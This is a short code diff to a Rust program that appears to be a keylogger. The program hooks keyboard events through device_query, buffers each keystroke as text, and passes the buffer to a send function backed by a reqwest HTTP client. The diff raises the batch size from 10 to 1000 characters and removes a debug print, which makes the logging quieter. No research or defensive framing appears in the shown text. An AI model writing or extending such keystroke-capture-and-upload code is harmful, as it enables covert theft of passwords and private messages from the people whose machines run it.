@@ -1,12 +1,10 @@
 use std::sync::{Arc, Mutex};
-use std::thread;
 use device_query::{DeviceEvents, device_state};
 use device_query::Keycode;
 pub use device_query::device_events::KeyboardCallback;
 use device_query::{DeviceState, keymap};
 use device_query::CallbackGuard;
 use reqwest::blocking::Client;
-use reqwest::blocking::Response;
 use crate::sys::load_route;
 use crate::sys::get_id;
 use crate::sys::get_date;
@@ -32,9 +30,7 @@ fn listen2(device_state: DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
         let chars = keycode_to_string(*keys); 
         let mut cache = cache_clone.lock().unwrap();
         cache.push_str(chars);
-
-        println!("{}", cache);
-        if cache.len() >= 10 {
+        if cache.len() >= 1000 {
             send(cache.clone()); 
             println!("{}", cache);
             cache.clear();
